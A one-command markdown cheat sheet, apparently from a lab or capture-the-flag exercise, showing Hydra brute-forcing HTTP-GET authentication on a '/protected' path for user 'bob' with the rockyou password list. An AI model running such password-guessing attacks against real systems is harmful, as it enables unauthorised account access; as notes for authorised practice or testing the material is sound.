# Hydra Usage

## HTTP-GET
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.71.162 http-get /protected
```